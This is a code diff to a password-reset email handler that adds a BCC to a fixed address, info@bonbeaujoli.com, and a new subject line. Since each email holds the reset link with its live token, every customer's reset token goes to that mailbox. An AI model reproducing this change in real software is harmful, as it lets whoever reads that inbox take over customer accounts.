@@ -32,6 +32,10 @@ export default async function resetPasswordTokenHandler({
     channel: "email",
     template: "password-reset",
     data: {
+      emailOptions: {
+        bcc: "info@bonbeaujoli.com",
+        subject: "Request to reset password!"
+      },
       email: email,
       reset_url: `${urlPrefix}/account/reset-password?token=${token}&email=${email}`,
       preview: 'The reset customer password await...'
